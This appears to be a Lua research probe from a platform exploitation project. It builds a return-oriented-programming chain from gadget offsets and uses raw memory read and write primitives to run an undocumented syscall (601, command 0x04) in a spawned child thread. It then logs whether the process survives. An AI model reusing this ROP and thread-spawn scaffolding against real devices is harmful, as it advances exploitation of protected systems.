-- CRASH_CLASS: HIGH (sys 601 cmd 0x04 is expected to terminate the process;
--               if it is process-wide the capture simply stops, at a line we print)
-- PROBE 1341d: sys 601 cmd 0x04 -- does it kill the process, the thread, or return?
--
-- prior art:
--   docs/DEAD_ENDS.md  sys 601 bullet: 0x00 ret=0 buf=0x100; 0x01/0x02/0x05/0x06/0x0a/0x12/0x10 -1;
--                      0x07/0x09/0x0d/0x13/0x14/0x19 ret=0 empty; 0x03 and 0x04 terminate the process
--   results/phase23_cve_2026/322a_sys601_sweep_20261022_*.txt   complete non-lethal set (main thread)
--   results/phase23_cve_2026/323a_sys601_sweep_20261022_122329.txt  prints 0x00/0x01/0x02, no 0x03 line
--   results/phase14_final_push/324a_*.txt                        65-byte banner, claims "past the lethal 0x03"
--   results/phase14_final_push/55d_sys601_process_control_20261018_100435.txt  stops at 0x02
--   docs/SYSCALL_ABSENT_VS_LETHAL.md   a kill is a result about the call, never about handler existence
--   probes/phase21_next_vectors/396f_pop_r8_verify.lua  verified child-ROP shape
--   results/phase35_dead_end_reruns/1341a2_*.txt  thr_new(455) from this loader returns 0
--   results/phase35_dead_end_reruns/1341c_*.txt   a child in a blocking call can wedge the next thr_new
--
-- 0x03 and 0x04 are the only 601 commands with no per-call result line anywhere:
-- 323a dies inside 0x03 and 324a is a banner. The open question is whether the
-- death is process-wide (exit_group) or thread-local (a thread exit that the
-- parent survives). Calling it from a child separates the two: if the process
-- dies, the capture ends between the "spawn" line and the marker line printed
-- 400 ms later; if only the thread does, the marker stays at its sentinel, the
-- parent keeps running, and the canary and the 0x00 control still print.
-- One child only: 1341c showed a second thr_new is what wedges when the first
-- child never returns.

print("=== PROBE 1341d: SYS 601 CMD 0x04 IN A CHILD THREAD ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function parts(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    local n = N(v)
    if n < 0 then return 4294967295, 4294967295 end
    return math.floor(n / 4294967296) % 4294967296, n % 4294967296
end
local function hx(v)
    local h, l = parts(v)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function s64(v)
    local h, l = parts(v)
    if h >= 2147483648 then return l + (h - 4294967296) * 4294967296 end
    return h * 4294967296 + l
end

local pid = 0
pcall(function() pid = N(mk(20)()) end)
print("pid=" .. pid)

local stub = nil
pcall(function() stub = syscall.pipe.fn_addr end)
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local elo, ehi = rd(N(info) + 0x108), rd(N(info) + 0x10C)
if elo == nil or stub == nil then
    print("[0] no module base or stub; aborting")
    print("=== PROBE 1341d ABORTED ===")
    return
end
local eb = ehi * 4294967296 + elo
print(string.format("eb=%X  stub=%s", eb, tostring(stub)))

local function g(off)
    local lo = elo + off
    local hi = ehi
    if lo >= 4294967296 then
        hi = hi + math.floor(lo / 4294967296)
        lo = lo % 4294967296
    end
    return uint64(string.format("0x%X%08X", hi, lo))
end
local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)

-- fake TCB so a failing syscall inside a child can read %fs:0
local tcb_buf = memory.alloc(0x10000)
zero(tcb_buf, 0x10000)
local tcb_mid = N(tcb_buf) + 0x8000
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

-- sigaction struct with sa_handler = SIG_IGN (1)
local sa = memory.alloc(16)
zero(sa, 16)
wq(sa, uint64(1))

-- spawn one child that runs `num(a1,a2,a3,a4)`, stores the result in *marker,
-- then thr_exit(0). Returns tid, marker address, ok.
local function spawn(num, a1, a2, a3, a4)
    local marker = memory.alloc(8)
    wq(marker, uint64(0xDEADDEAD))
    local stk = memory.alloc(0x10000)
    zero(stk, 0x10000)
    local base = N(stk)
    local nominal = 0x400
    local top = base + nominal
    local rsp = (top - (top % 16)) - 8
    local sp = rsp
    local function push(v) wq(sp, v); sp = sp + 8 end
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))          -- SET_FSBASE
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)
    push(uint64(416))
    push(pop_rdi_ret); push(uint64(12))           -- SIGSYS
    push(pop_rsi_ret); push(uint64(N(sa)))
    push(pop_rdx_ret); push(uint64(0))
    push(stub)
    push(uint64(num))
    push(pop_rdi_ret); push(uint64(a1))
    push(pop_rsi_ret); push(uint64(a2))
    push(pop_rdx_ret); push(uint64(a3))
    push(pop_rcx_ret); push(uint64(a4))
    push(stub)
    push(pop_rdi_ret); push(uint64(N(marker)))
    push(mov_rdi_rax)
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    local pa = memory.alloc(0x38)
    zero(pa, 0x38)
    local tidp = memory.alloc(8)
    wq(tidp, uint64(0xDEADDEAD))
    wq(pa + 0x00, pop_rax_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(base))
    wq(pa + 0x18, uint64(nominal))
    wq(pa + 0x30, uint64(N(tidp)))
    local ok, rv = pcall(mk(455), uint64(N(pa)), uint64(0x38))
    print(string.format("  spawn(%d): ok=%s rv=%s tid=%s", num, tostring(ok),
        ok and s64(rv) or "?", hx(rq(tidp))))
    return rq(tidp), N(marker), ok
end

local function sleep_ms(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(N(ts)), uint64(0)) end)
end

print("[A] canary: getpid")
local c0 = 0
pcall(function() c0 = N(mk(20)()) end)
print("  getpid=" .. c0)

print("")
print("[B] 601 cmd 0x04 from a child -- if the next 3 lines are missing, the death was process-wide")
local buf = memory.alloc(0x200)
zero(buf, 0x200)
local tid, marker = spawn(601, 4, 0, N(buf), 0x100, 0)
print("  spawned; sleeping 400 ms")
sleep_ms(400)
local mv = rq(marker)
if mv == nil then
    print("  marker=<unreadable>")
else
    local mh, ml = parts(mv)
    local sentinel = (mh == 0 and ml == 0xDEADDEAD)
    print(string.format("  child rax=%d (%s)  %s", s64(mv), hx(mv),
        sentinel and "SENTINEL: the child never reached the store" or "STORE RAN"))
end
print(string.format("  buf[0]=%s buf[4]=%s", tostring(rd(N(buf))), tostring(rd(N(buf) + 4))))

print("")
print("[C] parent liveness")
local c1 = 0
pcall(function() c1 = N(mk(20)()) end)
print("  getpid=" .. c1 .. ((c1 == c0) and "  SAME PROCESS" or "  CHANGED?"))
print("  thr_kill(tid, 0) = " .. tostring(s64(mk(432)(uint64(s64(tid)), uint64(0)))))

print("")
print("[D] 601 cmd 0x00 control from the parent (measured ret=0, buf 0x100)")
zero(buf, 0x200)
local ok00, rv00 = pcall(mk(601), uint64(0), uint64(0), uint64(N(buf)), uint64(0x100), uint64(0), uint64(0))
print(string.format("  601(0x00): ok=%s rv=%s buf[0]=%s", tostring(ok00),
    ok00 and s64(rv00) or "?", tostring(rd(N(buf)))))

print("")
print("=== PROBE 1341d COMPLETE ===")
